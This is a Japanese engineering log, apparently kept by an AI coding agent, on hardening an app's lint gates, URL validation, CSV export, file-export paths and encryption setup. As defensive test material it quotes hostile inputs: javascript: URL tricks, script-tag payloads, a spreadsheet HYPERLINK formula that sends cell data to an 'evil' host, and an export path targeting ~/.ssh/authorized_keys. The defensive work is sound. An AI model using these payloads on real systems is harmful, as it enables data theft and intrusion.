正当な 1 件を消して同時に危ない 1 件を足すと、件数が変わらないので通る。
一致行の中身まで台帳に載せれば閉じるが、変数名を変えただけで鳴る台帳になり、
**読む人が中身を追えなくなる**。実際に起きるのは「新しい違反が増える」形
なので、そちらを取った。

### 台帳の粒度を 5 つ全部で確かめた —— 2 つが穴、3 つは無事 (2026-08-23)

前項で `lint:forbidden` の例外台帳が「ファイル単位」だったので、
**同じ形の台帳を持つゲートを全部**同じやり方で試した。
**やり方は「台帳に載っているものの隣に、新しい違反を足す」**。

| ゲート | 鍵の粒度 | 結果 |
|---|---|---|
| `lint:forbidden` | `規則 :: パス` | ❌ **穴** → 件数を足して修正 (前コミット) |
| `lint:charset` | `パス :: 字` | ❌ **穴** → 件数を足して修正 (本コミット) |
| `lint:network-targets` | `パス + テンプレート文字列` | ✅ 無事 —— 新しい可変ホスト送信は即鳴った |
| `lint:mutation-scope` | `パス + 箇所数 + 行数` | ✅ 無事 —— 既に件数を持っていた |
| `lint:url-encoding` | 台帳 0 件 | ✅ 免除が無いので穴も無い |

#### `lint:charset` の穴

鍵が `パス::字` だけだったので、**免除済みの字はそのファイルの中なら
何度でも増やせた**。免除は「この修正記録に 1 回出てくる」ことへの免除で
あって、「この字はこのファイルで自由」ではない。

`{ n: 1, why: '…' }` へ変え、`n` を超えた分だけ findings に載せる。
自己検査に境界 3 件 (1 件許して 2 件 / 2 件許して 2 件 / 2 件許して 3 件) を追加。

#### プローブが 3 回不発だった (0-a-15 の再演)

このセッションで**3 度**「鳴らなかった」を先にゲートの穴と読み違えた:

1. `lint:mutation-scope` へ 3 行の `Stryker disable` → **span 上限が 30 行**
   なので対象外。40 行にしたら鳴った
2. `lint:charset` のプローブが `"notes"` キーを置換しようとしたが、
   **そのキーがファイルに無く不発**。パッチが当たっていなかった
3. 同上を修正するとき、当たったことを確かめずにもう一度読んだ

**規則**: 対照実験は「鳴ったか」を読む前に、**パッチが当たったことを
数えて確かめる**。今回は 「対象のハングル 1 文字の出現回数 = 1 → 2」 を出力に含めてから読んだ。

#### そしてこの節を書いた直後、`lint:charset` に自分が捕まった

対照実験で使ったハングル 1 文字を**この文書に字面で引用した**ため、
`lint:charset` が 2 件 (この文書と `SESSION_HANDOFF.md`) を検出した。
**このセッションで 2 度目の同じ誤り**である (1 度目は台帳へ引用したとき)。

> **検査対象の文字を、検査対象のファイルへ引用しない。**
> 字そのものではなく「対象のハングル 1 文字」と**説明で書く**。
> ゲートは正しく鳴っている —— 直すのは文書のほう。

### 自分で足した壁が「必ず測る」名簿に無かった (2026-08-23)

`lint:mutation-scope` の `MUST_MEASURE` は「権限・資格情報・書き出し先を
決める壁」を列挙し、`mutate` から外れないことを保証する。
**このセッションで足した壁が 3 つとも入っていなかった**:

| ファイル | 状態 |
|---|---|
| `src/renderer/oauth/pkceSession.ts` | **`mutate` にすら無かった** (PKCE の一時秘密の置き場と消し方) |
| `src/main/externalUrlGate.ts` | `mutate` に在るが名簿に無い → 一覧から外しても誰も鳴らない |
| `src/shared/httpLimits.ts` | 同上 |

3 つとも名簿へ入れ、`pkceSession.ts` は `mutate` にも足した (240 件)。
変異検査は **100%** (9 変異体)。名簿は 23 → **26 ファイル**。

> **壁を新しく作ったら、「必ず測る」名簿にも入れる。**
> 台帳は自動では育たない —— 育てるのを忘れると、翌日の自分が穴を開ける。

### 直したはずの PKCE の掃除が、別の関数に入っていた (2026-08-23)

**このセッション最大の自分の誤り。** 先に報告した「PKCE の一時秘密を
`finally` で捨てるようにした」は**実物に入っていなかった**。

置換の錨を `finally { setBusy(false); }` にして `replace(..., 1)` した結果、
**ファイル内の最初の一致**に当たった。それは `complete()` ではなく
**資格情報スロットの保存関数 `save()`** だった。同時に `complete()` からは
元の (try の中の) 掃除を消していたので、結果は:

```
  save()      … 資格情報を 1 つ保存するたびに進行中の PKCE を壊す
  complete()  … 成功しても失敗しても一切消えない  ← 直す前より悪い
```

**検査は全部緑だった。** 変異検査も 100% だった。

#### なぜ検査が捕まえられなかったか

書いた検査 `runLikeComplete` は `complete()` と同じ制御の流れの**再現**で
あって、**実物ではない**。再現のほうは正しく動くので緑になる。

> **対象の*再現*を検査しても、対象が変わっていないことは分からない。**

「直す前の形」を対照として持たせたのも同じ理由で無力だった ——
対照が試していたのは*再現の中の分岐*であって、実物の `complete()` ではない。

#### 直したこと

1. `save()` から誤って入った掃除を外し、`complete()` の `finally` へ入れ直した
   (今度は関数を**名前で切り出してから**置換し、どの関数に入ったかを
   出力して確かめた)
2. **実物を見る検査を 4 件**足した —— `complete()` の本文を名前で切り出し、
   `exchangeGoogleCode` を含むこと (別の関数を見ていない対照)、
   `finally` に `clearPkceSession()` が在ること、掃除が `finally` より前
   (= try の中) だけに無いこと、**PKCE と無関係な関数が呼んでいないこと**
3. 対照実験: **自分の誤りをそのまま再現**すると 3 件落ち、戻すと 22 件通る。
   パッチが当たったこと (`clearPkceSession` の総数 = 2) を確かめてから読んだ

#### 一般化

ページの中のクロージャは、このリポジトリには描画して叩く土台が無い。
本物を叩けないときは、**主張の単位で実物の字面を見る** (0-a-17 と同じ形) ——
「`complete()` の `finally` に掃除が在る」という主張そのものを確かめる。
再現を検査するより弱く見えるが、**再現では絶対に捕まらない誤りを捕まえる**。

### このセッションの修正が「実際に効いているか」を全部数え直した (2026-08-23)

前項で**報告した修正が実物に入っていなかった**ので、
このセッションで触った経路を 1 つずつ「入ったか」ではなく
**「叩いて確かめられているか」**で数え直した。

| 経路 | 入っていたか | 駆動する検査 |
|---|---|---|
| `microsoft-365` `send-mail` | ✓ | ✓ `fetchTimeouts` |
| `shopify` `sync-to-discord` | ✓ | ✓ `fetchTimeouts` |
| `security` `check-email-breach` | ✓ | ✓ `fetchTimeouts` |
| `business` / `stocks` `advise` | ✓ | ✓ `fetchTimeouts` |
| `oauth` `refresh` | ✓ | ✓ `fetchTimeouts` |
| `assistant` `chatAll` の伏字 | ✓ | ✓ `rendererBoundMessages` |
| ollama `warnings` (到達不可) | ✓ | ✓ `rendererBoundMessages` |
| **`oauth` `authorize` の交換** | ✓ | ❌ **無し** → 追加 |
| **ollama `warnings` (モデル一覧)** | ✓ | ❌ **無し** → 追加 |
| **`pkce` `exchangeGoogleCode`** | ✓ | ❌ **無し** → 追加 |

字面はどれも正しく入っていた。だが 3 経路は**何も留めていなかった** ——
消しても誰も気づかない状態だった。

#### 追加した 3 件と、その対照実験

- `authorize()` の交換に `signal` が在ること
  (既存の統合検査に 1 行追加。対照: `signal` を外すと落ちる)
- ollama の **2 本目の** warnings 経路 —— `/api/version` に成功してから
  `/api/tags` で落ちる形でしか通らないので別に組んだ。
  `call > 1` を確かめて**的を外していないこと**も同時に見る
  (対照: 伏字を外すと 3 件落ちる)
- `exchangeGoogleCode` の `signal` / 上限 / JSON でない応答
  (対照: `signal` を外すと落ちる)

#### 錨の重複を数えてから置換する

前項の誤りは `replace(..., 1)` が**別の一致**に当たったことだった。
今回はすべての置換で **`s.count(anchor) == 1` を assert してから**置換し、
外した対照実験でも**パッチが当たったこと (件数の変化) を出力してから**
結果を読んだ。1 度、正規表現で壊してしまい `Tests no tests` になったのを
「対照が鳴らない」と読み違えかけた —— **落ちた理由が「壊れて読めない」か
「検査が鳴った」かは別物**なので、そこも確かめる。

### 外部 URL の判定が 2 実装あり、攻撃入力 29 種のうち 6 種で答えが割れた (2026-08-23)

「同じ判断の 2 実装」を探す軸に戻り、**外へ開く URL の判定**を見た。

```
  デスクトップ  src/main/externalUrlGate.ts   new URL で解析 → protocol を集合で判定 → 正規化した値を返す
  ブラウザ      web-shim.ts の openExternal   /^https?:\/\//i   ← 字面検査
```

攻撃入力 29 種で突き合わせた実測:

| 入力 | main | browser |
|---|---|---|
| `"https://\njavascript:alert(1)"` | 拒否 | **通す** |
| `"http://\u0000evil"` | 拒否 | **通す** |
| `"https:/\\evil.com"` | 通す (正規化) | 拒否 |
| `"https:example.com"` | 通す (正規化) | 拒否 |
| `"https:/example.com"` | 通す (正規化) | 拒否 |
| `"https\t://example.com"` | 通す (正規化) | 拒否 |

#### 効くのは前 2 つ —— 検査したものと開くものが違う

字面は `https://` で始まるので regex は通す。だが **`window.open` が実際に
開くのは解析後の URL** である。ブラウザは URL 中の改行や NUL を落として
解釈するので、「調べた文字列」と「開かれる URL」が別物になりうる。

今日のブラウザではどちらも無害化される (host が `javascript` になって
ナビゲーションが失敗する) ので**現時点で悪用はできない**。危ないのは形の
ほうで、**検査が別のものを見ている**状態は、ブラウザの URL 解析が変わった
瞬間に穴になる。後ろ 4 つは逆向きの害で、正当なリンクを黙って開かない。

#### 直したこと

`externalUrlGate.ts` を `src/main/` から **`src/shared/` へ移し**、
ブラウザ版も同じ関数を通すようにした。**2 実装を 1 つにして差そのものを消す。**
この関数は解析してから判定し、**正規化した値を返す**ので、
「調べたもの」と「開くもの」が一致する。

- 扉の数え上げをブラウザ版にも追加 (`window.open` の数 = `externalUrlOrNull`
  の数、自前のスキーム判定が復活していない、**開くのは `safe` であって生の
  `url` ではない**)
- 対照実験: 旧実装へ戻すと 3 件落ちる
- 変異検査 100% (13 変異体)。保護対象・`mutate`・`MUST_MEASURE` のパスも追随

#### 既存の検査が「旧実装の副作用」を固定していた

`webShimBridge.test.ts` は `' https://example.com'` (先頭空白) を
**「開かない」側**に並べていた。だが字面検査が空白を弾いていたのは
**アンカーの副作用**であって、意図した守りではない。
デスクトップ版は最初から `new URL` で解析して正規化して開いており、
`shared/__tests__/externalUrlGate.test.ts` が
`'  https://example.com/  '` → `'https://example.com/'` を前から固定していた。

**2 つのビルドで答えが違うとき、どちらが正しいかを決めてから検査を直す。**
ここは解析する側が正しい (WHATWG は URL の前後の空白を落とす)。
検査を「落として正規化して開く」へ書き換え、理由を添えた。

### 「2 実装ある関数」の census が 1 度きりだった (2026-08-23)

`dualBuildParity.test.ts` の頭にはこう書いてある:

> 2026-08-22 に main / renderer の両方で定義されている関数名を機械で洗ったら
> 36 件あった

**洗ったのは 1 度きりで、数え直す仕組みが無かった。** 明日 2 実装が増えても、
パリティ検査が無いまま誰にも気づかれない。

数え直すと現在 **18 件**。うち **2 件が照合されていなかった** ——
`renderDashboardHtml` / `renderDashboardMarkdown` である。

#### その 2 件は実測した結果、安全だった

引数の型が違う (main は `StocksSnapshot`、ブラウザは平坦な `watchlist`) ので
入出力を直接比べるパリティ検査は組めない。代わりに**敵性入力を通して出口を
見た** —— `<script>alert(1)</script>` と `" onload="alert(1)` を
`symbol` / `label` / `signal.reason` / `signal.strategy` へ入れる。
**4 通りとも生タグを出さなかった** (どちらも `escapeXml` を通している)。

#### 精度のために分類する台帳にした

「重複はすべてパリティ検査が要る」にすると `sma` / `ema` / `rsi` のような
**純計算まで鳴る**。受理すべき対象が並ぶゲートは無視されるので作らない。

```
  'decision'   同じ答えを返さねばならない判定 → パリティ検査が要る   9 件
  'pure'       純計算。ずれれば数字が違うだけ                        7 件
  'different'  名前が同じだけで別の関数 (引数の型が違う)             2 件
```

双方向 —— 増えても減っても鳴る。`'decision'` は**パリティ検査が実際に
import していること**まで確かめる (分類だけして検査を書かないと、
台帳が「守っているつもり」の一覧になる)。

#### 対照実験が 2 度、自分の検査の欠陥を暴いた

1. **`text.includes(name)` で判定していた** → `sma` を `decision` へ
   付け替えても鳴らなかった。`dualBuildParity.test.ts` の注記に
   「sma / ema / rsi … のような純計算」と**書いてあった**ため。
   0-a-17 と同じ形 —— 「ファイルのどこかに在るか」は同居で無効化される。
   **import しているか**を見るよう直した
2. 直した途端 `safeStateEquals` が「検査が無い」と挙がった → **今度は
   厳しすぎた**。`stateEqualsParity.test.ts` は electron のモックを先に
   効かせるため**動的 `await import()`** を使っており、静的 import しか
   見ていなかった。両方の形を拾うよう直した

> **対照実験は、対象だけでなく検査自身の欠陥も暴く。**
> 1 度目は緩すぎ、2 度目は厳しすぎた。どちらも「鳴るはず/鳴らないはず」を
> 先に決めてから走らせたから気づけた。

### CSV の数式打ち消しは在ったが、新しい経路を通す強制が無かった (2026-08-23)

「一度きりの計測」を探す軸で `data/csv.ts` に当たった。

#### 実装はよく出来ていた (実測した清算)

| 見たこと | 結果 |
|---|---|
| 数式の起点 | `= + - @ \t \r` の **6 種すべて** (OWASP の一覧と一致) |
| 打ち消し方 | 先頭へ `'` を足す。`unguardFormula` で**往復しても値が変わらない** |
| 負の数を壊さないか | `looksNumeric` が `-1` / `-1.5` / `-0.5e3` を通す |
| 4 つの書き出しが関門を通るか | `salesToCsv` / `ratiosToCsv` / `statementToCsv` / `kpiActualsToCsv` **全部通っている** |

#### だが新しい経路を強制する仕組みが無かった

`salesCsv.ts` へ手組みの

```ts
export function probeToCsv(rows) { return rows.map((r) => r.join(',')).join('\r\n'); }
```

を足しても、**27 のゲートすべてが緑のまま**通った。
数式注入は「開いた人の手元でセルの中身が外へ出る」形の穴で、
`=HYPERLINK("http://evil/?"&A1)` を書き出したファイルへ埋め込めば成立する。

**このセッションで繰り返し出た形である —— 関門は在るが、新しい経路を
そこへ通す強制が無い** (打ち切りの 6 経路 / 伏字の 2 経路 / 外部 URL の
2 実装と同じ)。

#### 足した検査 (精度を先に測ってから)

規則を決める前に**誤検知の量を数えた**:

- `export function *Csv` を持つファイル → 4 件 (関門自身 + 3 ビルダー)、
  全部が関門を import している = **誤検知 0**
- `.join(',')` と行連結が同居するファイル → **1 件 (関門自身のみ)** = 誤検知 0

どちらも精度が出るので両方入れた。加えて**打ち消しの対象 6 種を*振る舞いで*
留める** (定数は export されていないので、字面ではなく `needsFormulaGuard`
の答えで確かめる —— 変更に強い)。

対照実験 3 本、すべて鳴った:

1. 手組みの行連結を足す → 鳴る
2. 関門を import しない `*Csv` ファイルを作る → 鳴る
3. 打ち消しの対象から `\t` / `\r` を外す → 2 件鳴る

### 書き出し先の関門も、新しい経路を通す強制が無かった (2026-08-23)

CSV と同じ問いを `isSafeExportPath` へ当てた。

#### 今在る 8 つの書き出しは全部正しかった (実測した清算)

| 書き出し | 状態 |
|---|---|
| `templates.export-template` | ✓ `isSafeSvgExportPath` 越しに関門 |
| `teamradar.export-svg` | ✓ 同上 |
| `stocks.export-dashboard` / `-md` | ✓ `isSafeDashboardPath` / `isSafeDashboardMdPath` |
| `business.export-dashboard` / `-md` | ✓ `isSafeBusinessDashboardPath` |
| `saveStocksState` / `saveTeamRadarState` | ✓ payload ではなく**固定パス** (`deps.statePath` は検査の継ぎ目) |

**最初の走査は 8 件すべてを「関門なし」と誤って挙げた** ——
`isSafeExportPath` の字面を探したが、実際には `isSafeSvgExportPath` のような
**薄い包み**越しに呼ばれていた。読んで確かめるまで報告しなかった。

#### だが新しい経路を強制する仕組みが無かった

関門を通さない書き出し action を足すと `lint:test-coverage` が鳴った ——
**が、鳴った理由が違う** (「その action の検査が無い」)。
形だけの検査を 1 つ添えると、**27 のゲートすべてが緑のまま**通った。

> **「鳴った」ことと「正しい理由で鳴った」ことは別物である。**
> 対照実験では**何が鳴ったか**まで読む。

乗っ取られたレンダラーから `outPath: '~/.ssh/authorized_keys'` のような値で
**$HOME 外・任意拡張子へ書ける**形で、このリポジトリ自身が脅威モデルに
挙げている条件の中にある。

#### 足した検査 (精度を先に測ってから)

規則: **`payload` を読み、かつファイルを書く関数は `isSafe*Path` を呼ぶこと。**
今の木へ当てて**誤検知 0 件**を確認してから入れた (薄い包みも `isSafe\w*Path`
で受かる)。陰性対照 6 件 —— 関門なし / 関門あり / 薄い包み / 固定パス /
payload を読むが書かない / **コメントの中の関門は数えない**。

対照実験: 実物へ関門なしの書き出しを足すと
`src/main/clients/teamradar.ts: probeExport (L550)` と**場所を名指しして**鳴る。

### markup のエスケープ —— 規則は作れなかったので、実測で留めた (2026-08-23)

`escapeXml` にも同じ問い (「新しい経路を強制するか」) を当てた。
**今回は規則を作らないのが正しい判断だった。**

#### 規則を作る前に誤検知の量を数えた

markup を組み立てる 7 ファイルの `${}` を数えると:

```
  エスケープ済み : 119 件
  素の補間       : 632 件   ← 大半は数値 (W / H / W / 2) と計算値と
                             `safeColor` 済みの色
```

「markup の中の `${}` は全部 `escapeXml` を通すこと」を規則にすると、
**受理すべき対象が 632 件**並ぶ。このリポジトリが繰り返し書いているとおり、
**鳴らし続けて無視されるゲートが最悪の結末**である。作らなかった。

型を追えば絞れるが、そのために AST の依存を足すのは釣り合わない
(`scripts/` は AST パーサ非依存という方針がある)。

#### 代わりに実測で留めた —— 押さえていなかった 2 つ

markup を組み立てるのは 7 ファイル。5 つは既に押さえてあった
(`templateParamsParity` / `stocks` の 2 つのダッシュボード / `web-templates`)。
**押さえていなかったのがこの 2 つ**:

| 経路 | 何が載るか | 実測 |
|---|---|---|
| `teamradar` の SVG 書き出し | payload の `title` | **正しくエスケープされている** |
| `business` のダッシュボード | LLM 応答 (summary / rationale / actionItems / riskFactors) + 単位名 | **同上** |

どちらも安全だったが、**消えたときに気づく物が無かった**ので実測で留めた。
対照実験: `title` のエスケープを外すと 2 件落ちる。
対照 (ふつうの文字列はそのまま載る) も置いて、空虚に通っていないことを示した。

#### 錨の重複を数える習慣が効いた

対照実験で `${escapeXml(opts.title ?? '…')}` を 1 箇所だけ外そうとしたら、
**`count(anchor) == 1` の assert が止めた** —— 実際には SVG の組み立てが
2 つあり、同じ式が 2 箇所に在った。前に「置換が別の関数へ入った」誤りを
やっているので入れた歯止めで、そのとおりに効いた。

### 共有の関門の総ざらいを終えた —— 最後の 3 つは無事だった (2026-08-23)

「関門は在るが、新しい経路をそこへ通す強制が無い」という軸で
共有の関門を全部見終えた。**この回は新しい欠陥が出なかった。**
掘り直さないために、見た所と結論を残す。

| 関門 | 結果 |
|---|---|
| 打ち切り・応答サイズ (`httpLimits`) | ❌ 6 経路が迂回 → 直して実測で留めた |
| 伏字 (`redactSecrets`) | ❌ 2 経路が迂回 → 直した。**境界は両方の出口で強制されている** |
| 外部 URL (`externalUrlGate`) | ❌ 2 実装が 6 種で食い違い → 1 つに統合 |
| 書き出し先 (`isSafeExportPath`) | ✅ 8 経路とも正しい。**強制が無かったので検査を追加** |
| CSV の数式打ち消し | ✅ 実装は完全。**強制が無かったので検査を追加** |
| markup (`escapeXml`) | ✅ 正しい。**規則は誤検知 632 件で作らず**、実測で留めた |

#### 今回見て、何も無かった 3 つ

**1. 伏字の境界は両方の出口で強制されている**

例外の文言を値へ載せている箇所を数えると 50 件出たが、**call site を
数えていた**のが誤りだった。実際には*出口*が伏字を掛けている:

```
  main        13 ハンドラすべてが safeErrorMessage
  ブラウザ版  err() の中で redactForMessage —— 21 の call site が全部ここを通る
```

資格情報らしき値の補間 44 件も、**42 件は Authorization ヘッダ** (正しい用途)、
残り 2 件は Basic 認証の組み立てと招待コードの導出だった。

**2. 社内ライセンスは「軽量ゲート」と明記されている**

`INTERNAL_INVITE_SECRET` は同梱され、`shortToken` は FNV-1a (暗号学的では
ない)。だが `SELF_PRODUCT_ALL_ACCESS = true` で**ゲート自体が既定で無効**、
課金もサーバー検証も無く、プランが左右するのは機能の出し分けだけで
**security の制御は 1 つも通っていない**。モジュールの説明文が
「強固な DRM ではない」と最初から書いており、**意図された設計**である。

**3. Service Worker は守りも検査も揃っている**

GET のみ / **同一オリジンのみ** (第三者 API の応答を端末へ残さない) /
`res.ok` のときだけキャッシュ / 画面遷移だけアプリシェルへ落とす。
`serviceWorker.test.ts` が 10 件でこれを全部留めている。

#### この回、プローブを 3 度外した

1. 例外文言の走査 → **call site を見て出口を見ていなかった** (`err()` が伏字)
2. 資格情報の補間 → 最初は「token という*語*」を探し、**値の補間**を
   探していなかった (22 件すべて定数文だった)
3. Service Worker の検査を `sameOrigin` で grep → **検査名が日本語**なので
   見つからず「留めていない」と誤読しかけた

3 件とも報告する前に読んで確かめた。
**「無い」と言う前に、探し方が的を射ているかを先に疑う** (0-a-15)。

### 出典の URL スキームを誰も見ていなかった (2026-08-23)

軸を変え、**データ由来の値が特権操作へ届く経路**を見た。

#### まず「危険なスキーム」を数えた —— 0 件だった

知識データの `url` / `sourceUrl` / `href` を全部数える:

```
  https  12,225 件
  http       22 件
  それ以外    0 件   ← javascript: / data: / file: は 1 件も無い
```

データ由来の URL が `openExternal` へ届く経路は 5 つある
(`EligibilityChecker` の `j.sourceUrl` / `WelfareSchemeCard` の `src.url` /
`DataList` の `item.href` / `AtlassianPage` の 2 つ)。**どれも共有の
`externalUrlGate` を通る**ので、仮に汚染されても `javascript:` は開かない。

#### だが平文 http が 22 件あり、誰も見ていなかった

`lint:citations` は出典の内部矛盾を、`lint:doi-prefix` は出版社のずれを
見ているが、**スキームは 3 つのゲートのどれも見ていない**。

平文で配られる出典は経路上で**書き換えられる**。利用者が「確証済み」と
言われて開いた先が別物になりうる以上、**「検証済みの出典」という主張が
弱くなる**。読むだけの公開ページなので影響は限定的で、これは
**コードの脆弱性ではなく、データの完全性**の話である。

22 件は学術 PDF (Yale / Piketty / Harvard / JHU)・Scholarpedia・JSTOR・
BAILII (英国判例) 等。

#### 直さなかった —— 推測で出典を直さない

`http://` を機械的に `https://` へ置き換えるのは**推測**である。
その URL が https で同じ物を返す保証は無く、リダイレクト先が別ページの
ことも、https を提供していないことも、URL 自体が古いこともある。
このリポジトリの規則どおり、**確かめずには直さない**。

代わりに**双方向の台帳**にした —— 増えれば鳴り、直して減っても鳴る
(台帳も一緒に直させる)。文言に「https で同じ物が引けるか**実際に確かめて**
から決めること」と書いてある。

対照実験 2 本: 台帳に無い平文 http を足すと**その URL を名指しして**鳴る /
`javascript:` を混ぜると 2 件鳴る。

#### プローブをまた 1 度外した

対照 1 の最初の試みで `probeUrl: 'http://…'` を足したが**鳴らなかった**。
抽出の正規表現は `url` / `sourceUrl` / `href` を**大文字小文字を区別して**
見るので、`probeUrl` は対象外だった。ゲートの穴ではなく**プローブの不具合**。
`url:` に直したら鳴った。

### 知識ベース書き出しの封じ込め —— 守りは在るが、強制はできなかった (2026-08-23)

データ由来の id がファイル名になる経路 (`notes/<collection>/<category>/<id>.md`)
を見た。**過去に `..` で外へ出られた穴**が在り、`safe-vault-write.cjs` を
足して塞いだ経緯がある。

#### 守りの現状 (実測)

| 見たこと | 結果 |
|---|---|
| `safe-vault-write.cjs` の自己検査 | ✅ 封じ込め・前方一致する兄弟・NUL・絶対パス・**1 件でも外なら何も書かない** |
| `vault:check` | ✅ **双方向** —— `欠落` / `余分` / `内容差分` を全部見る |
| `export-notebooklm.cjs` の書き出し名 | ✅ `VOLUME_SPECS` 表の**定数** (`nn` / `slug`)。データ由来ではない |
| `knowledge-autopilot.cjs` | ✅ `QUEUE_PATH` は定数 |

`vault:check` が `余分` を見るので、**vault の中へ**紛れ込んだ書き出しは捕まる。

#### 残る隙間と、ゲートを作らなかった理由

塞げていないのは「**vault の外**へ、データ由来の名前で書く新しい経路」。
実測: `build-knowledge-graph.cjs` の `safeWrite.writeFilesInto(...)` を
素の `writeFileSync` へ置き換えると、**`verify:all` が鳴った** ——
だが鳴らしたのは eslint の `'safeWrite' is assigned a value but never used`
だけだった。**import ごと消せば何も鳴らない。**

規則を作ろうとして精度を測った:

```
  「knowledge-vault に触れ、かつ書き込む script は safe-vault-write を使う」
     → 3 件中 2 件が誤検知 (export-notebooklm / knowledge-autopilot は
        どちらも定数パスへ書いており、封じ込めは要らない)
```

`writeFileSync` の宛先が変数である箇所も数えたが **24 ファイル 28 件**で、
ほぼ全部が定数のモジュールパスかディレクトリ走査の結果だった。
どちらの形でも**受理すべき対象が並ぶ**ので、`escapeXml` のときと同じ判断で
**ゲートは作らない**。

現実的な守りは「`safe-vault-write.cjs` が唯一の扉であること」を
文書と自己検査で保ち、`vault:check` の双方向性で vault 内の異物を捕まえること。
**次に触る人へ**: 新しい書き出しを足すときは `safeWrite.writeFilesInto` を
通すこと。通さない形は機械では捕まらない。

#### 自分が残した死んだ `eslint-disable` を消した

`pkceSession.test.ts` に `// eslint-disable-next-line @typescript-eslint/no-require-imports`
を書いていたが、この設定では `require()` が元々報告されないので**指示が死んで
いた** (eslint が "Unused eslint-disable directive" と警告)。
`verify:all` は警告では落ちないので、**緑のまま埋もれていた**。
`readFileSync` を通常の import へ直して指示ごと消した。

### 緑のまま見逃される信号を数えた —— `lint` が警告で落ちていなかった (2026-08-23)

前項で「死んだ `eslint-disable` が**警告**として出ていたのに `verify:all` は
緑だった」ことに気づいたので、**緑のまま黙認されている信号**を全部数えた。

| 見たこと | 結果 |
|---|---|
| eslint の警告 | ❌ **`"lint": "eslint ."` は警告で落ちない** → `--max-warnings 0` を付けた |
| 飛ばされている検査 (`.skip` / `.todo` / `xit`) | ✅ **0 件** |
| 実行時コードの型抑止 (`@ts-ignore` / `@ts-nocheck`) | ✅ **0 件** |
| 警告を出すが `exit(1)` を持たない gate | ✅ **0 件** (26 gate すべて失敗経路を持つ) |

#### `--max-warnings 0` を付けた

警告は「気づかれない不具合の置き場」になる。今回の死んだ指示は
**`verify:all` を 1 度も落とさずに残り続けた**。今は警告 0 件なので、
`--max-warnings 0` を付けても新しい負債は出ない —— **付けられるのは
今しかない** (溜まってからでは付けられなくなる)。

対照実験: 死んだ指示を 1 件戻すと `lint` が exit 1、消すと exit 0。

`CLAUDE.md` のコマンド説明も同時に直した (`lint:docs` は gate が ci.yml に
在るかを見るので、**コマンドの中身の変化は捕まえない**)。

### 暗号化の有効化が途中で落ちると、salt を失って二度と開けなくなる (2026-08-23)

ブラウザ版の保存時暗号化 (`recordEncryption.ts`) を見た。
**これはデータ消失の経路である。**

#### 何が起きるか

`enableEncryption` の順序が逆だった:

```
  1. salt を生成 (メモリ上だけ)
  2. 既存レコードを封緘        ← reencryptAll。1 件ずつ別トランザクション
  3. meta (salt + KCV) を保存  ← ここまで来て初めて salt が残る
```

2 で落ちると (容量超過・タブを閉じた・IndexedDB のエラー):

```
  封緘済みのレコード … 何件か出来ている
  salt              … 保存されていない  ← 二度と作れない
```

`IDENTITY_CIPHER.decrypt` は封緘を見つけると明示的に投げるので**黙って
壊れはしない**が、**正しいパスフレーズを知っていても鍵を導出できない**。
実測で確認した (封緘後に meta 保存を飛ばすと `list()` が
「暗号化されたレコードです」で投げ、salt が無いので復旧手段が無い)。

#### 直し方 —— meta を先に保存する

先に保存すれば、途中で落ちても失うものが無い。パスフレーズ側の `decrypt` は
**平文を素通しする**ので、封緘済みと平文が混ざった状態をそのまま読めるし、
`reencryptAll` を再実行すれば完了できる。**この素通しはまさにこの状態の
ために在る**のに、順序がそれを使えなくしていた。

#### 解除側は最初から正しかった

`disableEncryption` は復号を全部終えてから `clearMeta()` する。
コメントにも「**解除の側が throw すると逃げ道が無くなる**ので、こちらの
方が重い」と書いてある —— **同じ理屈が有効化側にも要る**ことに
気づいていなかった。片側だけ考えて、対称性を確かめなかった形である。

#### 留めたもの

順序そのものを 2 件で留めた —— 「`reencryptAll` が呼ばれる時点で meta が
既に在る」「移行が落ちても salt は残り、パスフレーズで読み直せる」。
前者は `metaAtMigration` が `'not-called'` のままでないことも見て、
**検査が的を外していないこと**を同時に確かめる。

対照実験: 元の順序へ戻すと 2 件とも落ちる。変異検査 100%。

### 「OS キーチェーンで守っている」が、ブラウザ版でも出ていた (3 件目) (2026-08-23)

対になる操作の対称性を見る軸で `setToken` / `clearToken` を追っていて、
保存状態カードに行き当たった。

#### 何が嘘だったか

`SettingsPage` の「保存時の保護状態」カードは、`encrypted` が true なら
無条件にこう書いていた:

> ✅ 暗号化されています
> トークンは **OS のキーチェーン由来の鍵で**暗号化して保存されています。

**ブラウザ版の `storageProtection` は `encrypted: true` を固定で返す。**
そしてブラウザに OS キーチェーンは無い —— 実際に鍵を握っているのは
**マスターパスワードから PBKDF2 で導出した鍵**である。

「OS が守る」と「あなたのパスフレーズが守る」は**利用者にとって別の話**で、
後者はパスフレーズの強さがそのまま強度になる。OS が守ると読んだ人は
「弱いパスフレーズでもよい」と判断しうる。

#### なぜ前回の修正で捕まらなかったか

このセッションで既に「トークンは OS キーチェーンに暗号化保存されます」を
2 画面直し、検査も足していた。**その検査は字面 1 つを見ていた**:

```
  /トークンは\s*OS\s*キーチェーンに\s*暗号化保存されます/
```

今回の文は「OS の**キーチェーン由来の鍵で**暗号化して**保存されています**」
—— **同じ主張なのに当たらない**。0-a-17 と同じ形が、今度は
**自分が書いた検査**で再演した。

#### 直し方 —— データに真実を持たせる

画面が推測するのをやめ、`StorageProtection` に `mechanism` を足した:

```
  'os-keychain'     OS が鍵を持つ (利用者のパスフレーズに依存しない)
  'webcrypto-vault' マスターパスワードから PBKDF2 で導出した鍵
  'obfuscated'      base64 の難読化のみ (暗号化ではない)
```

main は `safeStorage.isEncryptionAvailable()` から、web-shim は
`'webcrypto-vault'` と名乗る。画面はこれで文言を選ぶ。

検査は**主張の単位**へ広げた (`キーチェーン(に|由来の鍵で|の鍵で)…(暗号化|保存)`)
うえで、「その一文が `mechanism` を見た分岐の中に在る」ことを確かめる。
対照実験: 無条件の文言へ戻すと 2 件落ちる。

#### 既存の不変条件が正しく効いた

`secretsProtection.test.ts` の「返す鍵の一覧を固定する」検査が、
**`mechanism` を足した瞬間に落ちた**。目的は「秘密を載せる欄が黙って
増えないこと」で、まさにそのとおり働いた。一覧を更新したうえで、
`mechanism` が 3 値の列挙しか返さない (店の中身から作らない) ことも足した。

#### 併せて測った、対になる操作 (清算)

| 対 | 結果 |
|---|---|
| `enableEncryption` / `disableEncryption` | ❌ 順序が非対称 → 前コミットで修正 |
| `startAutoLock` / `handle.dispose()` | ✅ `disposed` 番人で**冪等**。`useEffect` の後始末で呼ばれる |
| `registerBiometric` / `verifyBiometric` | ✅ **意図的な fail-closed** (常に throw・未配線・不変条件を明記) |
| vault の `lock` / `setToken` / `clearToken` | ✅ 3 つとも解錠必須 + 同じ id 検証 |
